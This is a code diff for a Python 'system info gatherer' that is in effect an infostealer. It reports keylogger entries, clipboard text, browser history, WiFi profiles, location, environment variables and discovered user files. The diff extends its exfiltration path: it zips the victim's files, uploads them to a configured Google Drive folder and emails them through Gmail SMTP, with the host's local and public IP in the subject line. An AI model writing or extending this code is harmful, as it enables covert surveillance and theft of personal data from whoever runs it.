-        disks = data.get('disk_info', [])
-        lines.append("\n--- DISK INFO ---")
-        for disk in disks:
-            lines.append(f"  Drive: {disk.get('device', 'N/A')} ({disk.get('mountpoint', 'N/A')})")
-            lines.append(f"    Type:  {disk.get('file_system_type', 'N/A')}")
-            lines.append(f"    Total: {disk.get('total_size', 0) / (1024**3):.2f} GB")
-            lines.append(f"    Used:  {disk.get('used', 0) / (1024**3):.2f} GB ({disk.get('percentage', 'N/A')}%)")
-            lines.append(f"    Free:  {disk.get('free', 0) / (1024**3):.2f} GB")
-        
-        # GPU Info
-        gpus = data.get('gpu_info', [])
-        lines.append("\n--- GPU INFO ---")
-        for gpu in gpus:
-            lines.append(f"  Name:    {gpu.get('name', 'N/A')}")
-            lines.append(f"  RAM:     {gpu.get('adapter_ram', 'N/A')}")
-            lines.append(f"  Driver:  {gpu.get('driver_version', 'N/A')}")
-        
-        # Motherboard
-        mb = data.get('motherboard_info', {})
-        lines.append("\n--- MOTHERBOARD INFO ---")
-        lines.append(f"  Manufacturer:  {mb.get('manufacturer', 'N/A')}")
-        lines.append(f"  Product:       {mb.get('product', 'N/A')}")
-        lines.append(f"  Serial:        {mb.get('serial_number', 'N/A')}")
-        
-        # BIOS
-        bios = data.get('bios_info', {})
-        lines.append("\n--- BIOS INFO ---")
-        lines.append(f"  Manufacturer:  {bios.get('manufacturer', 'N/A')}")
-        lines.append(f"  Version:       {bios.get('version', 'N/A')}")
-        
-        # Uptime
-        uptime = data.get('system_uptime', {})
-        lines.append("\n--- SYSTEM UPTIME ---")
-        lines.append(f"  Boot Time:     {uptime.get('boot_time', 'N/A')}")
-        lines.append(f"  Uptime:        {uptime.get('uptime', 'N/A')}")
-        
-        # Installed software / services / startup
-        installed = data.get('installed_software', [])
-        services = data.get('running_services', [])
-        startup = data.get('startup_programs', [])
-        lines.append("\n--- ADDITIONAL SYSTEM INFO ---")
-        lines.append(f"  Installed software count: {len(installed)}")
-        lines.append(f"  Running services count:   {len(services)}")
-        lines.append(f"  Startup programs count:   {len(startup)}")
-        lines.append(f"  Browser history entries: {sum(len(v) for v in data.get('browser_history', {}).values() if isinstance(v, list))}")
-        lines.append(f"  Clipboard types: {', '.join(data.get('clipboard_info', {}).get('clipboard_types', [])) or 'None'}")
-        lines.append(f"  Screenshots found: {data.get('screenshot_info', {}).get('count', 0)}")
-        lines.append(f"  Keylogger lines: {data.get('keylogger_info', {}).get('line_count', 0)}")
-        lines.append(f"  USB devices found: {len(data.get('usb_info', {}).get('devices', [])) if isinstance(data.get('usb_info'), dict) else 0}")
-        lines.append(f"  Files discovered: {data.get('files_info', {}).get('count', 0)}")
-        lines.append(f"  Active connections: {len(data.get('net_info', {}).get('active_connections', []))}")
-        lines.append("  Full system details are attached as JSON and TXT files.")
+        lines.append(f"  Total          : {total_gb:.2f} GB")
+        lines.append(f"  Used           : {used_gb:.2f} GB ({mem.get('percentage', 'N/A')}%)")
+        lines.append(f"  Available      : {avail_gb:.2f} GB")
+        lines.append(f"  Swap Total     : {mem.get('swap_total', 0) / (1024**3):.2f} GB")
+        lines.append(f"  Swap Used      : {mem.get('swap_used', 0) / (1024**3):.2f} GB ({mem.get('swap_percentage', 'N/A')}%)")
 
-        # Network Summary
+        # ── 4. DISK INFO ──
+        disks = data.get('disk_info', [])
+        lines.append(f"\n[4] DISK INFO ({len(disks)} partitions)")
+        lines.append(sub_sep)
+        for i, disk in enumerate(disks, 1):
+            lines.append(f"  [{i}] {disk.get('device', 'N/A')} -> {disk.get('mountpoint', 'N/A')}")
+            lines.append(f"      File System : {disk.get('file_system_type', 'N/A')}")
+            lines.append(f"      Total       : {disk.get('total_size', 0) / (1024**3):.2f} GB")
+            lines.append(f"      Used        : {disk.get('used', 0) / (1024**3):.2f} GB ({disk.get('percentage', 'N/A')}%)")
+            lines.append(f"      Free        : {disk.get('free', 0) / (1024**3):.2f} GB")
+
+        # ── 5. GPU INFO ──
+        gpus = data.get('gpu_info', [])
+        lines.append(f"\n[5] GPU INFO ({len(gpus)} adapters)")
+        lines.append(sub_sep)
+        for i, gpu in enumerate(gpus, 1):
+            lines.append(f"  [{i}] {gpu.get('name', 'N/A')}")
+            lines.append(f"      Adapter RAM    : {gpu.get('adapter_ram', 'N/A')}")
+            lines.append(f"      Driver Version : {gpu.get('driver_version', 'N/A')}")
+            lines.append(f"      Driver Date    : {gpu.get('driver_date', 'N/A')}")
+            lines.append(f"      Video Mode     : {gpu.get('video_mode_description', 'N/A')}")
+
+        # ── 6. MOTHERBOARD INFO ──
+        mb = data.get('motherboard_info', {})
+        lines.append(f"\n[6] MOTHERBOARD INFO")
+        lines.append(sub_sep)
+        lines.append(f"  Manufacturer   : {mb.get('manufacturer', 'N/A')}")
+        lines.append(f"  Product        : {mb.get('product', 'N/A')}")
+        lines.append(f"  Version        : {mb.get('version', 'N/A')}")
+        lines.append(f"  Serial Number  : {mb.get('serial_number', 'N/A')}")
+
+        # ── 7. BIOS INFO ──
+        bios = data.get('bios_info', {})
+        lines.append(f"\n[7] BIOS INFO")
+        lines.append(sub_sep)
+        lines.append(f"  Manufacturer   : {bios.get('manufacturer', 'N/A')}")
+        lines.append(f"  Name           : {bios.get('name', 'N/A')}")
+        lines.append(f"  Version        : {bios.get('version', 'N/A')}")
+        lines.append(f"  Release Date   : {bios.get('release_date', 'N/A')}")
+
+        # ── 8. SYSTEM UPTIME ──
+        uptime = data.get('system_uptime', {})
+        lines.append(f"\n[8] SYSTEM UPTIME")
+        lines.append(sub_sep)
+        lines.append(f"  Boot Time      : {uptime.get('boot_time', 'N/A')}")
+        lines.append(f"  Uptime         : {uptime.get('uptime', 'N/A')}")
+
+        # ── 9. NETWORK INFO ──
         network = data.get('network_info', {})
         io = network.get('io_counters', {})
-        lines.append("\n--- NETWORK IO ---")
-        lines.append(f"  Bytes Sent:    {io.get('bytes_sent', 0) / (1024**2):.2f} MB")
-        lines.append(f"  Bytes Recv:    {io.get('bytes_recv', 0) / (1024**2):.2f} MB")
-        
-        lines.append("\n" + "=" * 60)
-        lines.append("  END OF REPORT")
-        lines.append("=" * 60)
-        
+        lines.append(f"\n[9] NETWORK INFO")
+        lines.append(sub_sep)
+        lines.append(f"  Public IP      : {net_info.get('public_ip', net_info.get('public_ip_error', 'N/A'))}")
+        lines.append(f"  Local IP       : {sys_info.get('ip_address', 'N/A')}")
+        lines.append(f"  Bytes Sent     : {io.get('bytes_sent', 0) / (1024**2):.2f} MB")
+        lines.append(f"  Bytes Received : {io.get('bytes_recv', 0) / (1024**2):.2f} MB")
+        lines.append(f"  Packets Sent   : {io.get('packets_sent', 0)}")
+        lines.append(f"  Packets Recv   : {io.get('packets_recv', 0)}")
+        # DNS Servers
+        dns = net_info.get('dns_servers', [])
+        if dns:
+            lines.append(f"  DNS Servers    : {', '.join(dns)}")
+        # WiFi profiles
+        wifi = net_info.get('wifi_profiles', [])
+        if wifi:
+            lines.append(f"  WiFi Profiles  : {len(wifi)} found")
+            for wp in wifi:
+                lines.append(f"    - {wp}")
+        # Network Interfaces
+        interfaces = network.get('interfaces', {})
+        if interfaces:
+            lines.append(f"\n  Network Interfaces ({len(interfaces)}):")
+            for iface_name, addrs in interfaces.items():
+                for addr in addrs:
+                    lines.append(f"    {iface_name} [{addr.get('type', '?')}]: {addr.get('address', 'N/A')} / {addr.get('netmask', 'N/A')}")
+        # Active connections
+        conns = net_info.get('active_connections', [])
+        if conns:
+            lines.append(f"\n  Active TCP Connections ({len(conns)}):")
+            for c in conns[:30]:
+                lines.append(f"    Local: {c.get('local', 'N/A')}  ->  Remote: {c.get('remote', 'N/A')}  (PID {c.get('pid', '?')})")
+            if len(conns) > 30:
+                lines.append(f"    ... and {len(conns) - 30} more")
+
+        # ── 10. BROWSER HISTORY ──
+        browser = data.get('browser_history', {})
+        total_entries = sum(len(v) for v in browser.values() if isinstance(v, list))
+        lines.append(f"\n[10] BROWSER HISTORY ({total_entries} entries)")
+        lines.append(sub_sep)
+        for browser_name in ['chrome', 'edge', 'firefox']:
+            entries = browser.get(browser_name, [])
+            error = browser.get(f'{browser_name}_error', None)
+            if error:
+                lines.append(f"  {browser_name.title()}: Error - {error}")
+            elif entries:
+                lines.append(f"  {browser_name.title()} ({len(entries)} entries):")
+                for entry in entries[:15]:
+                    if isinstance(entry, dict):
+                        lines.append(f"    [{entry.get('visit_time', entry.get('last_visit_date', 'N/A'))}] {entry.get('title', 'N/A')}")
+                        lines.append(f"      URL: {entry.get('url', 'N/A')}")
+                    else:
+                        lines.append(f"    {entry}")
+                if len(entries) > 15:
+                    lines.append(f"    ... and {len(entries) - 15} more entries")
+            else:
+                lines.append(f"  {browser_name.title()}: No entries found")
+
+        # ── 11. CLIPBOARD INFO ──
+        clip = data.get('clipboard_info', {})
+        lines.append(f"\n[11] CLIPBOARD INFO")
+        lines.append(sub_sep)
+        lines.append(f"  Content Types  : {', '.join(clip.get('clipboard_types', [])) or 'None'}")
+        lines.append(f"  Has Image      : {clip.get('clipboard_has_image', False)}")
+        clip_text = clip.get('clipboard_text', '')
+        if clip_text:
+            preview = clip_text[:500].replace('\n', '\\n')
+            lines.append(f"  Text Preview   : {preview}")
+            if len(clip_text) > 500:
+                lines.append(f"  (Truncated, full length: {len(clip_text)} chars)")
+
+        # ── 12. SCREENSHOT INFO ──
+        screenshot = data.get('screenshot_info', {})
+        lines.append(f"\n[12] SCREENSHOT INFO")
+        lines.append(sub_sep)
+        lines.append(f"  Total Found    : {screenshot.get('count', 0)}")
+        ss_list = screenshot.get('screenshots', [])
+        for ss in ss_list[:10]:
+            lines.append(f"    [{ss.get('modified', 'N/A')}] {ss.get('path', 'N/A')} ({ss.get('size_bytes', 0)} bytes)")
+
+        # ── 13. KEYLOGGER INFO ──
+        keylog = data.get('keylogger_info', {})
+        lines.append(f"\n[13] KEYLOGGER INFO")
+        lines.append(sub_sep)
+        lines.append(f"  Active         : {keylog.get('present', False)}")
+        lines.append(f"  Log File       : {keylog.get('path', 'N/A')}")
+        lines.append(f"  Total Lines    : {keylog.get('line_count', 0)}")
+        key_entries = keylog.get('last_entries', [])
+        if key_entries:
+            lines.append(f"  Last {len(key_entries)} Entries:")
+            for entry in key_entries:
+                lines.append(f"    {entry}")
+
+        # ── 14. LOCATION INFO ──
+        loc = data.get('location_info', {})
+        lines.append(f"\n[14] LOCATION INFO")
+        lines.append(sub_sep)
+        if isinstance(loc, dict) and 'error' not in loc:
+            for src, val in loc.items():
+                if isinstance(val, dict):
+                    lines.append(f"  Source: {src}")
+                    for k, v in val.items():
+                        lines.append(f"    {k}: {v}")
+                else:
+                    lines.append(f"  {src}: {val}")
+        else:
+            lines.append(f"  {loc.get('error', 'No location data available')}")
+
+        # ── 15. USB DEVICE INFO ──
+        usb = data.get('usb_info', {})
+        lines.append(f"\n[15] USB DEVICE INFO")
+        lines.append(sub_sep)
+        if isinstance(usb, dict) and 'error' not in usb:
+            devices = usb.get('devices', [])
+            lines.append(f"  USB Devices ({len(devices)}):")
+            for i, dev in enumerate(devices[:20], 1):
+                if isinstance(dev, dict):
+                    lines.append(f"    [{i}] {dev.get('Name', dev.get('name', 'N/A'))}")
+                else:
+                    lines.append(f"    [{i}] {dev}")
+            drives = usb.get('removable_drives', [])
+            if drives:
+                lines.append(f"  Removable Drives ({len(drives)}):")
+                for drv in drives:
+                    if isinstance(drv, dict):
+                        lines.append(f"    {drv.get('drive', 'N/A')} - {drv.get('label', 'N/A')} ({drv.get('filesystem', 'N/A')})")
+                    else:
+                        lines.append(f"    {drv}")
+        else:
+            lines.append(f"  {usb.get('error', 'No USB data available')}")
+
+        # ── 16. FILES INFO ──
+        files = data.get('files_info', {})
+        lines.append(f"\n[16] DISCOVERED FILES")
+        lines.append(sub_sep)
+        lines.append(f"  Total Found    : {files.get('count', 0)}")
+        file_list = files.get('files', [])
+        for fi in file_list[:20]:
+            if isinstance(fi, dict):
+                lines.append(f"    {fi.get('path', fi.get('name', 'N/A'))} ({fi.get('size', fi.get('size_bytes', 'N/A'))} bytes)")
+            else:
+                lines.append(f"    {fi}")
+
+        # ── 17. RUNNING PROCESSES ──
+        procs = data.get('process_info', [])
+        if isinstance(procs, list):
+            lines.append(f"\n[17] RUNNING PROCESSES (top {len(procs)})")
+            lines.append(sub_sep)
+            lines.append(f"  {'PID':<8} {'Name':<30} {'User':<25} {'CPU%':<8} {'MEM%':<8}")
+            lines.append(f"  {'-'*8} {'-'*30} {'-'*25} {'-'*8} {'-'*8}")
+            for p in procs:
+                pid = str(p.get('pid', ''))[:7]
+                name = str(p.get('name', ''))[:29]
+                user = str(p.get('username', ''))[:24]
+                cpu_p = str(p.get('cpu_percent', ''))[:7]
+                mem_p = str(p.get('memory_percent', ''))[:7]
+                lines.append(f"  {pid:<8} {name:<30} {user:<25} {cpu_p:<8} {mem_p:<8}")
+
+        # ── 18. INSTALLED SOFTWARE ──
+        installed = data.get('installed_software', [])
+        lines.append(f"\n[18] INSTALLED SOFTWARE ({len(installed)} programs)")
+        lines.append(sub_sep)
+        for i, sw in enumerate(installed, 1):
+            name = sw.get('name', 'N/A')
+            ver = sw.get('version', 'N/A')
+            vendor = sw.get('vendor', 'N/A')
+            lines.append(f"  [{i:>3}] {name} v{ver} ({vendor})")
+
+        # ── 19. RUNNING SERVICES ──
+        services = data.get('running_services', [])
+        lines.append(f"\n[19] RUNNING SERVICES ({len(services)} active)")
+        lines.append(sub_sep)
+        for svc in services:
+            lines.append(f"  - {svc.get('display_name', svc.get('name', 'N/A'))} [{svc.get('start_mode', 'N/A')}]")
+
+        # ── 20. STARTUP PROGRAMS ──
+        startup = data.get('startup_programs', [])
+        lines.append(f"\n[20] STARTUP PROGRAMS ({len(startup)} entries)")
+        lines.append(sub_sep)
+        for prog in startup:
+            lines.append(f"  - {prog.get('name', 'N/A')}")
+            lines.append(f"    Command  : {prog.get('command', 'N/A')}")
+            lines.append(f"    Location : {prog.get('location', 'N/A')}")
+
+        # ── 21. ENVIRONMENT VARIABLES ──
+        env_vars = data.get('environment_variables', {})
+        lines.append(f"\n[21] ENVIRONMENT VARIABLES ({len(env_vars)} variables)")
+        lines.append(sub_sep)
+        for key in sorted(env_vars.keys()):
+            val = str(env_vars[key])
+            if len(val) > 200:
+                val = val[:200] + "..."
+            lines.append(f"  {key} = {val}")
+
+        # ── FOOTER ──
+        lines.append("")
+        lines.append(sep)
+        lines.append("  END OF COMPREHENSIVE SYSTEM REPORT")
+        lines.append(f"  Report Timestamp : {data.get('timestamp', 'N/A')}")
+        lines.append(f"  Local IP         : {sys_info.get('ip_address', 'N/A')}")
+        lines.append(f"  Public IP        : {net_info.get('public_ip', 'N/A')}")
+        lines.append(sep)
+
         return "\n".join(lines)
     
-    def send_email(self, data, recipient=EMAIL_TO):
-        """Send system information via email with JSON attachment"""
+    def send_email(self, data, recipient=EMAIL_TO, zip_file=None):
+        """Send system information via email with combined .txt.json and optional ZIP attachment"""
         try:
             if not GMAIL_APP_PASSWORD:
                 print("\n[ERROR] Gmail app password is not configured.")
                 print("Set GMAIL_APP_PASSWORD as an environment variable before sending email.")
                 return False
 
-            # Create the email message with both HTML and plain-text bodies plus attachments
+            # Create the email message
             msg = MIMEMultipart('mixed')
             msg['From'] = EMAIL_FROM
             msg['To'] = recipient
             hostname = data.get('basic_info', {}).get('system', {}).get('hostname', 'Unknown')
-            msg['Subject'] = f"System Info Report - {hostname} - {data.get('timestamp', 'N/A')}"
+            local_ip = data.get('basic_info', {}).get('system', {}).get('ip_address', 'N/A')
+            public_ip = data.get('net_info', {}).get('public_ip', 'N/A')
+            msg['Subject'] = f"System Report - {hostname} [{local_ip} / {public_ip}] - {data.get('timestamp', 'N/A')}"
 
+            # Email body (HTML + plain text)
             body_text = self.format_info_for_email(data)
             body_html = self.format_info_for_email_html(data)
 
@@ -1135,23 +1653,39 @@ class SystemInfoGatherer:
             alternative_part.attach(MIMEText(body_html, 'html', 'utf-8'))
             msg.attach(alternative_part)
 
-            # Attach the full JSON data as a txt file
+            # Build the single combined .txt.json content
             json_data = json.dumps(data, indent=4, default=str)
-            json_attachment = MIMEText(json_data, 'plain', 'utf-8')
-            timestamp = dt.now().strftime('%Y%m%d_%H%M%S')
-            json_attachment.add_header(
-                'Content-Disposition',
-                f'attachment; filename="system_info_{hostname}_{timestamp}.txt"'
-            )
-            msg.attach(json_attachment)
+            combined_content = body_text
+            combined_content += "\n\n"
+            combined_content += "=" * 70 + "\n"
+            combined_content += "  RAW JSON DATA (Machine-Readable)\n"
+            combined_content += "=" * 70 + "\n\n"
+            combined_content += json_data
 
-            # Attach the readable text report as a file
-            text_attachment = MIMEText(body_text, 'plain', 'utf-8')
-            text_attachment.add_header(
+            timestamp = dt.now().strftime('%Y%m%d_%H%M%S')
+            combined_attachment = MIMEText(combined_content, 'plain', 'utf-8')
+            combined_attachment.add_header(
                 'Content-Disposition',
-                f'attachment; filename="system_info_{hostname}_{timestamp}.txt"'
+                f'attachment; filename="system_report_{hostname}_{timestamp}.txt.json"'
             )
-            msg.attach(text_attachment)
+            msg.attach(combined_attachment)
+
+            # Attach the compressed ZIP file if provided (contains report + user files)
+            if zip_file and os.path.exists(zip_file):
+                zip_size_mb = os.path.getsize(zip_file) / (1024 * 1024)
+                if zip_size_mb <= 24:  # Gmail attachment limit ~25MB
+                    with open(zip_file, 'rb') as f:
+                        zip_attachment = MIMEBase('application', 'zip')
+                        zip_attachment.set_payload(f.read())
+                        encoders.encode_base64(zip_attachment)
+                        zip_attachment.add_header(
+                            'Content-Disposition',
+                            f'attachment; filename="{os.path.basename(zip_file)}"'
+                        )
+                        msg.attach(zip_attachment)
+                    print(f"Attached ZIP file: {zip_file} ({zip_size_mb:.2f} MB)")
+                else:
+                    print(f"ZIP file too large for email ({zip_size_mb:.1f} MB > 24 MB limit), skipping attachment.")
             
             # Send via Gmail SMTP
             print(f"Connecting to Gmail SMTP server...")
@@ -1209,33 +1743,40 @@ class SystemInfoGatherer:
 
 
 def auto_send():
-    """Automatically gather all system info, save reports, upload to Drive, and send via email."""
+    """Automatically gather all system info, save reports, compress, upload to Drive, and send via email."""
     print("\n[*] Gathering system information...")
     gatherer = SystemInfoGatherer()
     all_info = gatherer.get_all_system_info()
     
-    print("[*] Saving report files locally...")
-    json_file, txt_file = gatherer.save_report_files(all_info)
-    files_to_upload = [p for p in (json_file, txt_file) if p]
+    print("[*] Saving combined report file locally...")
+    combined_file = gatherer.save_report_files(all_info)
+    files_to_upload = [combined_file] if combined_file else []
 
     user_files = gatherer.get_files_to_upload()
     if user_files:
         files_to_upload.extend(user_files)
-        print(f"[*] Discovered {len(user_files)} user files for Drive upload.")
+        print(f"[*] Discovered {len(user_files)} user files.")
     else:
-        print("[*] No user files found for Drive upload.")
+        print("[*] No user files found.")
 
+    # Always compress files into a ZIP archive
+    zip_file = None
+    if files_to_upload:
+        print("[*] Compressing all files into a ZIP archive...")
+        zip_file = gatherer.compress_files_to_zip(files_to_upload)
+
+    # Try uploading to Google Drive
     folder_id = GOOGLE_DRIVE_FOLDER_ID or gatherer._extract_drive_folder_id(GOOGLE_DRIVE_FOLDER_LINK)
-    if folder_id and files_to_upload:
-        print("[*] Uploading files to Google Drive...")
-        folder_name = f"SystemInfoUpload_{dt.now().strftime('%Y%m%d_%H%M%S')}"
-        gatherer.upload_files_to_drive(files_to_upload, folder_id=folder_id, folder_name=folder_name)
+    if folder_id and zip_file:
+        print("[*] Uploading compressed ZIP to Google Drive...")
+        gatherer.upload_reports_to_drive([zip_file], folder_id)
     else:
-        print("[*] Google Drive upload skipped because folder ID is not configured or no files were available.")
+        print("[*] Google Drive upload skipped (no credentials or no files).")
 
+    # Send email with ZIP attached
     if GMAIL_APP_PASSWORD:
         print(f"[*] Sending email to {EMAIL_TO}...")
-        gatherer.send_email(all_info)
+        gatherer.send_email(all_info, zip_file=zip_file)
     else:
         print("[*] Email sending skipped because GMAIL_APP_PASSWORD is not configured.")
 
@@ -1317,25 +1858,25 @@ def main():
         elif choice == '13':
             print("Gathering all system information...")
             all_info = gatherer.get_all_system_info()
-            json_file, txt_file = gatherer.save_report_files(all_info)
-            if json_file and txt_file:
-                print(f"Saved report files: {json_file}, {txt_file}")
+            combined_file = gatherer.save_report_files(all_info)
+            if combined_file:
+                print(f"Saved combined report: {combined_file}")
                 folder_id = GOOGLE_DRIVE_FOLDER_ID or gatherer._extract_drive_folder_id(GOOGLE_DRIVE_FOLDER_LINK)
                 if folder_id:
-                    print("Uploading saved report files to Google Drive...")
-                    gatherer.upload_reports_to_drive([json_file, txt_file], folder_id)
+                    print("Uploading report to Google Drive...")
+                    gatherer.upload_reports_to_drive([combined_file], folder_id)
                 else:
                     print("Google Drive upload skipped because folder ID is not configured.")
         elif choice == '14':
             print("Gathering all system information...")
             all_info = gatherer.get_all_system_info()
-            json_file, txt_file = gatherer.save_report_files(all_info)
-            if json_file and txt_file:
-                print(f"Saved report files: {json_file}, {txt_file}")
+            combined_file = gatherer.save_report_files(all_info)
+            if combined_file:
+                print(f"Saved combined report: {combined_file}")
                 folder_id = GOOGLE_DRIVE_FOLDER_ID or gatherer._extract_drive_folder_id(GOOGLE_DRIVE_FOLDER_LINK)
                 if folder_id:
-                    print("Uploading saved report files to Google Drive...")
-                    gatherer.upload_reports_to_drive([json_file, txt_file], folder_id)
+                    print("Uploading report to Google Drive...")
+                    gatherer.upload_reports_to_drive([combined_file], folder_id)
                 else:
                     print("Google Drive upload skipped because folder ID is not configured.")
             print(f"Sending email to {EMAIL_TO}...")
